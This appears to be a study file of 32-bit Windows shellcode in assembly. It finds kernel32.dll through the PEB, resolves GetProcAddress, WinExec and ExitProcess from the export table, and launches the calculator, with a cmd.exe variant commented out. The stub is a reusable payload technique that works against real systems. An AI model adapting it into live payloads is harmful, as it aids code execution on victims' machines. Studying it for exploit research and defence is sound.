#
#      TODO: https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/
#            https://www.exploit-db.com/exploits/39900/
#
.intel_syntax noprefix

.section .text
    .global _start
_start:


start:

#  Find base address of kernel32.dll
#  ---------------------------------

#xor    ecx,ecx
mov    ecx,100

     # Load Process Environmnet Block (PEB) into eax register:
#mov    eax,fs:[ecx + 0x30]
mov   eax,fs:0x30

     # eax = PEB->Ldr
mov    eax,DWORD PTR [eax+0xc]

     # esi = PEB->Ldr.InMemOrderModuleList
mov    esi,DWORD PTR [eax+0x14]

     # eax = 2nd module of InMemOrderModuleList (ntdll.dll)
lods   eax,DWORD PTR ds:[esi]

     # swap esi and eax
xchg   esi,eax

     # eax = 3rd module of InMemOrderModuleList (kernel32.dll)
lods   eax,DWORD PTR ds:[esi]

     # ebx = base address of kernel32.dll (PVOID Dllbase)
mov    ebx,DWORD PTR [eax+0x10]

#  Find export table of kernel32.dll 
#  ---------------------------------

     # kernel32.dll base address + 0x3c = DOS->e_lfanew
mov    edx,DWORD PTR [ebx+0x3c]

     # DOS->e_lfanew+base address of kernel32.dll = PE Header
add    edx,ebx

     # PE Header + 0x78 = DataDirectory->VirtualAddress
mov    edx,DWORD PTR [edx+0x78]

     # DataDirectory->VirtualAddress + kernel32.dll base address = Export table of kernel32.dll (IMAGE_EXPORT_DIRECTORY)
add    edx,ebx

     # IMAGE_EXPORT_DIRECTORY + 0x20 = AddressOfNames
mov    esi,DWORD PTR [edx+0x20]

     # esi = AddressOfNames + kernel32.dll base address = kernel32.dll AddressOfNames
add    esi,ebx

     # ecx = 0
xor    ecx,ecx

#  Find GetProcAddress function name
#  ---------------------------------
Get_func:

     # increment orinal
inc    ecx

     # Get name offset
lods   eax,DWORD PTR ds:[esi]

     # name offset + kernel32.dll base address = Get Function name
add    eax,ebx

     # GetP
cmp    DWORD PTR [eax],0x50746547
jne    Get_func

     # rocA
cmp    DWORD PTR [eax+0x4],0x41636f72
jne    Get_func

     # ddre
cmp    DWORD PTR [eax+0x8],0x65726464
jne    Get_func

#  Find address of GetProcAddress
#  ---------------------------------

     # esi = (IMAGE_EXPORT_DIRECTORY + 0x24) = AddressOfNameOrdinals
mov    esi,DWORD PTR [edx+0x24]

     # AddressOfNameOrdinals + base address of kernel32.dll = AddressOfNameOrdinals of kernel32.dll
add    esi,ebx

     # cx = number of function
mov    cx,WORD PTR [esi+ecx*2]
dec    ecx

     # (IMAGE_EXPORT_DIRECTORY+0x1c) = AddressOfFunctions
mov    esi,DWORD PTR [edx+0x1c]

     # esi = beginning of address table
add    esi,ebx

     # edx = pointer (offset)
mov    edx,DWORD PTR [esi+ecx*4]

     # edx = address of GetProcAddress
add    edx,ebx

     # backing up address of GetProcAddress because EAX,EBX,EDX,ECX registers
     # will be overwritten by calling the function
xor    esi,esi
push   edx
pop    esi

     # baking up kernel32.dll base address
xor    edi,edi
push   ebx
pop    edi


     # Find address of WinExec()
# ? xor and push really necessary?
#   xor    ecx,ecx
#   push   ecx
push   0x00636578
push   0x456e6957

mov    ecx,esp

push   ecx
push   ebx

call   edx

     # Find address of ExitProcess()
# ? xor and push really necessary?
#   xor    ecx,ecx
#   push   ecx
push   0x00737365
push   0x636f7250
push   0x74697845

mov    ecx,esp

push   ecx
push   edi

# ? xor really necessary?
#   xor    edi,edi

     # eax = address of WinExec
mov    edi,eax

call   esi

# ----

# ? xor really necessary
#   xor    esi,esi
push   eax
pop    esi

     # call winexec
# ? xor and push really necessary?
#   xor    ecx,ecx
#   push   ecx

#  push cmd.exe
#
#push 0x00657865
#push 0x2e646d63

# push calc (without .exe)
push   0x00000000
push   0x434c4143

mov    ecx,esp

push   0x0
push   ecx

call   edi

     # exit
push   0x0
call   esi
